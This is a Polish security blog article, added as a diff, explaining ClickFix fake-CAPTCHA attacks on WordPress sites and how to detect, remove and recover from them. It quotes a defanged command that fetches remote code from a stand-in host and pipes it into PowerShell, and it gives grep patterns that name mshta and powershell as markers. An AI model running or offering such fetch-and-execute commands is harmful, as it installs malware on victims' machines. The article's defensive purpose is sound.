@@ -1,0 +1,142 @@
+<!--META
+{
+  "slug": "clickfix-falszywa-captcha",
+  "title": "ClickFix i fałszywa CAPTCHA: jak działa atak i jak go usunąć ze strony",
+  "metaTitle": "ClickFix: fałszywa CAPTCHA na stronie. Jak ją usunąć",
+  "description": "ClickFix to fałszywa CAPTCHA, która każe wkleić polecenie w Win+R i instaluje infostealera. Sprawdź, jak wykryć i usunąć ją ze strony i co zrobić po infekcji.",
+  "category": "Bezpieczeństwo",
+  "tags": ["ClickFix", "fałszywa CAPTCHA", "WordPress", "malware", "infostealer"],
+  "primaryKeyword": "ClickFix",
+  "tldr": [
+    "ClickFix to fałszywa weryfikacja „nie jestem robotem”, która po cichu kopiuje polecenie do schowka i każe je wkleić w oknie Win+R lub w terminalu.",
+    "Nakładki najczęściej pojawiają się na przejętych stronach WordPress: w fałszywych wtyczkach, plikach motywu, bazie danych albo jako loader pobierający kod z zewnątrz, także z blockchaina.",
+    "Końcowym ładunkiem są zwykle infostealery (Lumma, Vidar i inne), trojany zdalnego dostępu i loadery, które w firmach mogą poprzedzać ransomware.",
+    "Sprzątanie strony zaczyna się od kopii do analizy, a kończy na zmianie wszystkich haseł, usunięciu backdoorów i sprawdzeniu komputerów administratorów.",
+    "Jeśli wkleiłeś polecenie, odłącz komputer od sieci i z innego urządzenia zmień hasła oraz wyloguj wszystkie sesje, zaczynając od poczty."
+  ],
+  "faq": [
+    {"q": "Czy prawdziwa CAPTCHA może kazać nacisnąć Win+R?", "a": "Nie. Google reCAPTCHA i Cloudflare Turnstile działają w całości w przeglądarce i nigdy nie proszą o otwieranie okna Uruchom, PowerShella ani Terminala. Każda instrukcja z kombinacją klawiszy i wklejaniem tekstu w systemie oznacza oszustwo."},
+    {"q": "Czy samo wejście na stronę z fałszywą CAPTCHĄ infekuje komputer?", "a": "W typowym scenariuszu ClickFix nie. Infekcja następuje dopiero wtedy, gdy użytkownik wklei i uruchomi skopiowane polecenie. Zamknij kartę, a jeśli schowek mógł zostać nadpisany, skopiuj dowolny inny tekst, żeby przypadkiem go nie wkleić."},
+    {"q": "Dlaczego nie widzę fałszywej CAPTCHY na swojej stronie, choć klienci ją zgłaszają?", "a": "Wstrzyknięty kod często filtruje odwiedzających. Pomija zalogowanych użytkowników WordPressa, osoby, które już widziały nakładkę, a czasem wybrane systemy lub kraje. Sprawdzaj stronę w oknie prywatnym, bez logowania, z innej sieci i z komputera z Windows."},
+    {"q": "Czy ClickFix atakuje tylko Windows?", "a": "Nie. Microsoft opisał kampanie ClickFix na macOS, w których ofiara wklejała polecenie do Terminala i instalowała Atomic macOS Stealer. ESET wskazuje, że technika dotyczy Windows, macOS i Linuksa."},
+    {"q": "Czy antywirus ochroni przed ClickFix?", "a": "Częściowo. Microsoft Defender ma dedykowane wykrycia ClickFix, ale przestępcy stale zaciemniają polecenia i zmieniają ładunki. Skuteczniejsze jest połączenie ochrony stacji, blokady okna Uruchom dla zwykłych użytkowników i edukacji zespołu."}
+  ],
+  "sources": [
+    {"title": "Microsoft Security Blog: Think before you Click(Fix): Analyzing the ClickFix social engineering technique (08.2025)", "url": "https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/"},
+    {"title": "Microsoft Security Blog: TerminalFix campaign deploys a reverse tunnel through multistage intrusion (08.2026)", "url": "https://www.microsoft.com/en-us/security/blog/2026/08/28/terminalfix-campaign-deploys-reverse-tunnel-through-multistage-intrusion/"},
+    {"title": "CERT Polska: ClickFix w akcji: jak fake captcha może zaszyfrować całą firmę (02.2026)", "url": "https://cert.pl/posts/2026/02/fake-captcha-in-action/"},
+    {"title": "CERT Polska: Uwaga fałszywa CAPTCHA, czyli nie daj się zainfekować (11.2024)", "url": "https://cert.pl/posts/2024/11/Uwaga-falszywa-CAPTCHA-czyli-nie-daj-sie-zainfekowac/"},
+    {"title": "Rapid7: When Trusted Websites Turn Malicious: WordPress Compromises Advance Global Stealer Operation (03.2026)", "url": "https://www.rapid7.com/blog/post/tr-malicious-websites-wordpress-compromise-advances-global-stealer-operation/"},
+    {"title": "Sekoia: ClearFake's New Widespread Variant: Increased Web3 Exploitation for Malware Delivery (03.2025)", "url": "https://www.sekoia.com/blog/clearfakes-new-widespread-variant-increased-web3-exploitation-for-malware-delivery"},
+    {"title": "ESET Threat Report H1 2025: ClickFix fake error surges", "url": "https://www.eset.com/us/about/newsroom/research/eset-threat-report-clickfix-fake-error-surges-spreads-ransomware-and-other-malware/"},
+    {"title": "Patchstack: State of WordPress Security in 2026", "url": "https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/"}
+  ],
+  "linkedin": "Fałszywa CAPTCHA nie łamie żadnych zabezpieczeń. Prosi, żebyś zrobił to sam.\n\nNiedawno usuwaliśmy ClickFix ze strony klienta, więc zebrałem w jednym miejscu to, co warto wiedzieć:\n\n- Kliknięcie „Nie jestem robotem” po cichu kopiuje polecenie do schowka, a strona każe nacisnąć Win+R, Ctrl+V i Enter.\n- Nakładki siedzą głównie na przejętych stronach WordPress: w fałszywych wtyczkach, plikach motywu i bazie danych.\n- Administrator często ich nie widzi, bo kod pomija zalogowanych użytkowników.\n- Na końcu łańcucha są infostealery i trojany zdalnego dostępu. CERT Polska opisał firmę, w której jedno wklejone polecenie otworzyło drogę narzędziom poprzedzającym ransomware.\n- ESET odnotował wzrost wykryć ClickFix o ponad 500% w pierwszej połowie 2025 r.\n\nW artykule: jak sprawdzić swoją stronę, jak ją wyczyścić i co zrobić, jeśli ktoś już wkleił polecenie.\n\n{url}\n\n#cyberbezpieczeństwo #WordPress #ClickFix #malware"
+}
+META-->
+<p>ClickFix to atak, w którym fałszywa CAPTCHA („Zweryfikuj, że jesteś człowiekiem”) każe nacisnąć Win+R, wkleić polecenie i zatwierdzić Enterem. Polecenie zostało wcześniej po cichu skopiowane do schowka, więc ofiara sama uruchamia PowerShell, który pobiera złośliwe oprogramowanie, najczęściej infostealera. Żadna prawdziwa CAPTCHA nie wymaga wpisywania czegokolwiek w systemie.</p>
+<p>Niedawno usuwaliśmy ClickFix ze strony klienta. Poniżej opisuję, jak ten atak wygląda od strony odwiedzającego i od strony serwera, opierając się na publicznych analizach Microsoftu, CERT Polska, Rapid7 i Sekoia. Jeśli trafiłeś tu, bo już wkleiłeś polecenie, przejdź od razu do ostatniej sekcji.</p>
+
+<h2>Jak działa atak ClickFix krok po kroku?</h2>
+<p>Cały łańcuch opiera się na nawyku klikania w weryfikacje. Technicznie nie ma tu exploita przeglądarki, dlatego same aktualizacje systemu niewiele pomagają.</p>
+<ol>
+<li><strong>Wejście na zaufaną stronę.</strong> Ofiara otwiera zwykłą witrynę: lokalny portal, sklep, blog firmy. Przestępcy chętnie korzystają z przejętych stron, bo mają ruch i dobrą reputację.</li>
+<li><strong>Nakładka „weryfikacji”.</strong> Wstrzyknięty JavaScript wyświetla okno podszywające się pod Cloudflare Turnstile lub Google reCAPTCHA. W kampanii opisanej przez Rapid7 w marcu 2026 r. fałszywe okno Cloudflare pokazywało instrukcje w ponad 30 językach.</li>
+<li><strong>Podmiana schowka.</strong> Kliknięcie „Nie jestem robotem” uruchamia w tle <code>navigator.clipboard.writeText()</code>. Do schowka trafia polecenie, którego użytkownik nie widzi.</li>
+<li><strong>Instrukcja dla ofiary.</strong> Strona każe nacisnąć Win+R, potem Ctrl+V i Enter. Nowsze warianty kierują do Windows Terminala lub PowerShella (Microsoft opisał taką kampanię pod nazwą TerminalFix), a na macOS do Terminala.</li>
+<li><strong>Wykonanie.</strong> Polecenie korzysta z wbudowanych narzędzi Windows: <code>powershell</code>, <code>mshta</code>, <code>rundll32</code>, <code>curl</code>. Pobiera kolejny etap i często uruchamia go w pamięci, bez zapisywania pliku na dysku.</li>
+</ol>
+<p>Polecenie z incydentu opisanego przez CERT Polska w 2026 r. miało budowę zbliżoną do poniższej. Adres jest zneutralizowany, więc nic się nie uruchomi:</p>
+<pre><code class="language-text">cmd /c curl hxxp://przyklad[.]invalid/sciezka/ | powershell</code></pre>
+<p>Do polecenia bywa doklejany komentarz udający kod weryfikacyjny, np. „I am not a robot - reCAPTCHA Verification ID”. Microsoft wymienia takie teksty wśród wskaźników, których szuka w historii okna Uruchom (klucz rejestru RunMRU).</p>
+
+<h2>Jak strony zostają zainfekowane fałszywą CAPTCHĄ?</h2>
+<p>W WordPressie najczęściej spotyka się trzy scenariusze: podatna wtyczka lub motyw, przejęte hasło administratora albo zgadywanie haseł na otwartym panelu <code>wp-admin</code>. Rapid7 nie wskazał jednego wektora w swojej kampanii, ale zwrócił uwagę, że na większości zainfekowanych stron panel logowania był publicznie dostępny.</p>
+<p>Powierzchnia ataku jest spora. Według Patchstack w 2025 r. w ekosystemie WordPressa zgłoszono 11 334 nowe podatności, z czego 91% dotyczyło wtyczek. Wstrzyknięcie może siedzieć w kilku miejscach jednocześnie:</p>
+<table>
+<thead><tr><th>Gdzie szukać</th><th>Jak to zwykle wygląda</th><th>Na co zwrócić uwagę</th></tr></thead>
+<tbody>
+<tr><td>Fałszywa wtyczka</td><td>Ogólna nazwa sugerująca cache, SEO lub wydajność; kod dołącza skrypt do każdej strony</td><td>Wtyczki, których nikt nie instalował i których nie ma w repozytorium WordPress.org</td></tr>
+<tr><td>Pliki motywu</td><td>Zaciemniony JavaScript w <code>footer.php</code>, <code>header.php</code> lub <code>functions.php</code></td><td>Długie ciągi base64, <code>eval</code>, <code>atob</code>, świeża data modyfikacji</td></tr>
+<tr><td>Katalog <code>mu-plugins</code></td><td>Plik PHP ładowany automatycznie, którego nie da się wyłączyć z panelu</td><td>Każdy plik, którego nie potrafisz przypisać do znanego komponentu</td></tr>
+<tr><td>Baza danych</td><td>Skrypt w widżecie, opcjach motywu lub treści wpisu</td><td>Znaczniki <code>&lt;script&gt;</code> w tabelach <code>wp_options</code> i <code>wp_posts</code></td></tr>
+<tr><td>Zewnętrzny loader</td><td>Krótki skrypt, który pobiera właściwy kod z innej domeny, przez <code>admin-ajax.php</code> albo z blockchaina</td><td>Nieznane domeny w źródle strony, odwołania do węzłów Binance Smart Chain</td></tr>
+</tbody>
+</table>
+<p>Ostatni wiersz wymaga komentarza. Rodzina ClearFake, którą Sekoia analizowała w marcu 2025 r., pobiera treść fałszywej CAPTCHY z inteligentnego kontraktu na Binance Smart Chain (technika EtherHiding). Przestępca zmienia przynętę bez dotykania Twojej strony, a zablokowanie jednej domeny nic nie daje. Sekoia znalazła w lutym 2025 r. ponad 9300 stron z tym kodem i oceniała, że realnie może ich być dziesiątki tysięcy.</p>
+<p>Kod bywa też selektywny. Rapid7 opisał skrypty, które sprawdzały ciasteczka sesji WordPressa i nie pokazywały nakładki zalogowanym użytkownikom. Dlatego administrator zwykle dowiaduje się o problemie od klientów.</p>
+
+<h2>Co instaluje ClickFix na komputerze ofiary?</h2>
+<p>Według Microsoftu najczęstszym końcowym ładunkiem ClickFix był Lumma Stealer. Obok niego pojawiają się trojany zdalnego dostępu (XWorm, AsyncRAT, NetSupport, SectopRAT), loadery takie jak Latrodectus i MintsLoader oraz nadużywane legalne narzędzia do zdalnej pomocy, np. ScreenConnect. Na macOS kampanie ClickFix dostarczały Atomic macOS Stealer.</p>
+<p>Ładunki szybko się zmieniają. W kampanii opisanej przez Rapid7 w 2026 r. były to m.in. Vidar, Impure Stealer i VodkaStealer. Co taki program wyciąga z komputera i jak się po nim sprząta, opisuję we wpisie o <a href="/blog/lumma-stealer-infostealery/">infostealerach Lumma, StealC i Vidar</a>.</p>
+<p>Skutki nie zawsze kończą się na kradzieży haseł. CERT Polska opisał w lutym 2026 r. incydent w firmie, w którym jedno wklejone polecenie zainstalowało Latrodectus i loader Supper, czyli narzędzia rozpoznania i utrzymania dostępu, które mogą poprzedzać zaszyfrowanie całej sieci. ESET w raporcie za pierwsze półrocze 2025 r. podał, że wykrycia ClickFix wzrosły o ponad 500% względem drugiej połowy 2024 r., a technika odpowiadała za prawie 8% zablokowanych ataków i była drugim wektorem po phishingu.</p>
+
+<h2>Jak sprawdzić, czy Twoja strona wyświetla fałszywą CAPTCHĘ?</h2>
+<p>Zacznij od sygnałów z zewnątrz: klienci piszą o dziwnej weryfikacji, antywirusy blokują stronę, w Search Console pojawia się wpis w raporcie „Problemy dotyczące bezpieczeństwa”. Co zrobić z takim ostrzeżeniem, opisuję w tekście o <a href="/blog/ostrzezenie-google-strona-niebezpieczna/">ostrzeżeniu Google „strona niebezpieczna”</a>.</p>
+<p>Potem obejrzyj stronę oczami ofiary: okno prywatne, bez logowania, najlepiej komputer z Windows i inna sieć niż biurowa. Możesz też pobrać kod strony jako anonimowy użytkownik i wypisać ładowane skrypty:</p>
+<pre><code class="language-bash">curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" \
+  https://twojadomena.pl/ | grep -oiE '&lt;script[^&gt;]*src=[^&gt;]*&gt;' | sort -u</code></pre>
+<p>Szukaj domen, których nie rozpoznajesz. Loader może budować skrypty dynamicznie, więc czysty wynik niczego nie przesądza.</p>
+<p>Jeśli masz SSH i WP-CLI, przejdź do katalogu WordPressa i uruchom poniższe polecenia. Żadne z nich niczego nie zmienia, a flagi <code>--skip-plugins --skip-themes</code> sprawiają, że WP-CLI nie wykonuje kodu z potencjalnie zainfekowanych wtyczek i motywu:</p>
+<pre><code class="language-bash"># Rdzeń i wtyczki z WordPress.org porównane z oficjalnymi sumami kontrolnymi
+wp core verify-checksums
+wp plugin verify-checksums --all --skip-plugins --skip-themes
+
+# Administratorzy: szukaj loginów i adresów, których nie znasz
+wp user list --role=administrator --fields=ID,user_login,user_email,user_registered --skip-plugins --skip-themes
+
+# Pliki PHP i JS zmienione w ostatnich 14 dniach (GNU find)
+find . -type f \( -name "*.php" -o -name "*.js" \) -mtime -14 -printf '%TY-%Tm-%Td %p\n' | sort
+
+# Typowe ślady fałszywej CAPTCHY w plikach
+grep -rniE "clipboard\.writeText|mshta|powershell|verify you are human" wp-content/ --include="*.php" --include="*.js"
+
+# To samo w bazie danych
+wp db search 'clipboard.writeText' --all-tables-with-prefix --stats --skip-plugins --skip-themes
+wp db search 'powershell' --all-tables-with-prefix --stats --skip-plugins --skip-themes</code></pre>
+<aside class="callout"><p>Wyniki wyszukiwania traktuj jako tropy, nie jako dowód. Przyciski „kopiuj” we wtyczkach legalnie korzystają z API schowka, a <code>wp plugin verify-checksums</code> sprawdza tylko wtyczki z repozytorium WordPress.org. Komercyjne dodatki trzeba porównać z paczką od producenta.</p></aside>
+
+<h2>Jak usunąć ClickFix ze strony WordPress?</h2>
+<p>Najczęstszy błąd to usunięcie widocznego skryptu z <code>footer.php</code> i uznanie sprawy za zamkniętą. Wstrzyknięcie często ma więcej niż jedną kopię, a obok niego leży backdoor, który przywraca je po kilku minutach. Pracuj w tej kolejności:</p>
+<aside class="callout"><p>Zanim cokolwiek usuniesz, zrób pełną kopię plików i bazy danych, nawet zainfekowaną. Będzie potrzebna do ustalenia, jak przestępca wszedł, i do odtworzenia treści. Kasowanie plików i nadpisywanie katalogów jest nieodwracalne.</p></aside>
+<ol>
+<li><strong>Zabezpiecz dowody.</strong> Kopia plików, zrzut bazy (<code>wp db export</code>), logi serwera WWW i panelu hostingu z ostatnich tygodni.</li>
+<li><strong>Odetnij odwiedzających.</strong> Włącz przerwę techniczną na poziomie serwera albo zablokuj ruch w WAF. Każda godzina z aktywną nakładką to kolejne potencjalne ofiary.</li>
+<li><strong>Zamknij drzwi atakującemu.</strong> Usuń nieznane konta administratorów, zmień hasła do WordPressa, panelu hostingu, SFTP i bazy danych, a potem wygeneruj nowe klucze w <code>wp-config.php</code> poleceniem <code>wp config shuffle-salts</code>. To wyloguje wszystkie aktywne sesje.</li>
+<li><strong>Wymień rdzeń na czysty.</strong> Katalogi <code>wp-admin</code> i <code>wp-includes</code> zastąp świeżą kopią tej samej wersji WordPressa pobraną z wordpress.org.</li>
+<li><strong>Przejrzyj wtyczki i motyw.</strong> Usuń wszystko, czego nie instalowałeś. Pozostałe wtyczki wgraj ponownie z oficjalnych źródeł, motyw porównaj z oryginałem lub repozytorium Git. Sprawdź <code>wp-content/mu-plugins</code> i pliki PHP w <code>wp-content/uploads</code>, gdzie nie powinno ich być wcale.</li>
+<li><strong>Wyczyść bazę.</strong> Usuń skrypty z opcji, widżetów i treści znalezione przez <code>wp db search</code>. Rób to ręcznie, wpis po wpisie, bo automatyczne zamiany potrafią uszkodzić zserializowane dane.</li>
+<li><strong>Szukaj backdoorów.</strong> Web shell w przypadkowym katalogu przywróci infekcję mimo czystego motywu. Jak je rozpoznać, opisuję w tekście o <a href="/blog/backdoor-web-shell-php/">backdoorach i web shellach PHP</a>. Przejrzyj też <code>.htaccess</code> i zaplanowane zadania (<code>wp cron event list</code>).</li>
+<li><strong>Wyczyść cache.</strong> Wtyczka cache, cache serwera i CDN potrafią dalej serwować zainfekowaną wersję strony.</li>
+<li><strong>Sprawdź komputery administratorów.</strong> Jeśli przestępca zalogował się prawidłowym hasłem, mogło ono wyciec przez infostealera na czyimś laptopie. Nowe hasło wpisane na takim komputerze wycieknie tak samo.</li>
+<li><strong>Zweryfikuj z zewnątrz i obserwuj.</strong> Powtórz testy z poprzedniej sekcji, a przez kolejne tygodnie monitoruj zmiany plików. Jeśli Google oznaczył stronę, poproś o ponowne sprawdzenie w Search Console.</li>
+</ol>
+<p>Szerszą procedurę na pierwsze minuty po wykryciu włamania znajdziesz w poradniku <a href="/blog/zainfekowany-wordpress-objawy/">zainfekowany WordPress: objawy i pierwsza godzina</a>.</p>
+
+<h2>Jak zabezpieczyć stronę przed ponowną infekcją?</h2>
+<ul>
+<li>Aktualizuj wtyczki i motywy na bieżąco. Patchstack wylicza, że dla najczęściej atakowanych podatności ważona mediana czasu do pierwszego exploita wynosi 5 godzin.</li>
+<li>Usuwaj nieużywane wtyczki i motywy. Wyłączona wtyczka nadal leży na serwerze i nadal może mieć podatność.</li>
+<li>Włącz uwierzytelnianie dwuskładnikowe dla wszystkich kont z uprawnieniami administratora i redaktora.</li>
+<li>Ogranicz dostęp do <code>wp-admin</code> i <code>xmlrpc.php</code>: lista dozwolonych adresów IP, limit prób logowania, WAF.</li>
+<li>Dodaj <code>define('DISALLOW_FILE_EDIT', true);</code> w <code>wp-config.php</code>, żeby z panelu nie dało się edytować plików PHP.</li>
+<li>Monitoruj integralność plików. Nawet codzienny <code>wp core verify-checksums</code> w cronie z powiadomieniem mailowym wyłapie część zmian.</li>
+<li>Trzymaj kopie zapasowe poza serwerem i sprawdzaj, czy da się z nich odtworzyć stronę.</li>
+</ul>
+<p>Pełną listę znajdziesz w <a href="/blog/zabezpieczenie-wordpress-checklista/">checkliście zabezpieczenia WordPressa</a>.</p>
+<p>Po stronie firmy, której pracownicy mogą trafić na taką stronę, Microsoft zaleca m.in. wyłączenie okna Uruchom zasadą grupy (User Configuration &gt; Administrative Templates &gt; Start Menu and Taskbar &gt; Remove Run menu from Start Menu), logowanie bloków skryptów PowerShell i reguły ASR blokujące zaciemnione skrypty. Takie wdrożenia razem z monitoringiem stacji roboczych realizujemy w ramach <a href="/#bezpieczenstwo">usług bezpieczeństwa</a>.</p>
+
+<h2>Wkleiłem polecenie z fałszywej CAPTCHY. Co teraz?</h2>
+<p>Załóż, że komputer jest przejęty, a hasła zapisane w przeglądarce są już u przestępcy. Infostealer nie musi zostawać w systemie długo, żeby wysłać dane, więc liczy się kolejność działań, a nie to, czy antywirus coś pokazał.</p>
+<ol>
+<li><strong>Odłącz komputer od sieci</strong> (Wi-Fi i kabel). Jeśli to sprzęt służbowy, nie wyłączaj go bez konsultacji z działem IT, który może chcieć go zbadać.</li>
+<li><strong>Nie loguj się na nim do niczego.</strong> Każde nowe hasło wpisane na zainfekowanym urządzeniu może zostać przechwycone.</li>
+<li><strong>Z innego, czystego urządzenia zmień hasła</strong>: najpierw poczta e-mail, potem menedżer haseł, bank, konta firmowe, media społecznościowe.</li>
+<li><strong>Wyloguj wszystkie sesje</strong> w ustawieniach kont Google, Microsoft, Facebook i innych. Skradzione ciasteczka sesyjne pozwalają wejść na konto bez hasła i bez kodu 2FA.</li>
+<li><strong>Portfele kryptowalut</strong> traktuj jako spalone: przenieś środki do nowego portfela utworzonego na czystym urządzeniu.</li>
+<li><strong>Zgłoś incydent</strong>: w pracy do działu IT, prywatnie do CERT Polska przez incydent.cert.pl. Przy utracie pieniędzy zawiadom bank i policję.</li>
+<li><strong>Przeinstaluj system</strong> albo oddaj komputer do analizy. Po infekcji trojanem zdalnego dostępu lub loaderem samo skanowanie antywirusem nie daje pewności.</li>
+</ol>
+<p>Jeśli chcesz sprawdzić, co dokładnie zostało uruchomione, historia okna Uruchom jest zapisana w rejestrze. To polecenie tylko ją odczytuje:</p>
+<pre><code class="language-powershell">Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'</code></pre>
+<p>Przy wariantach z terminalem zajrzyj do historii PowerShella; ścieżkę do pliku zwraca <code>(Get-PSReadLineOption).HistorySavePath</code>. Zapisz te informacje dla osoby, która będzie analizować incydent, i nie otwieraj adresów, które tam znajdziesz. Nie wklejaj ich też na forach, bo często prowadzą do aktywnej infrastruktury przestępców.</p>
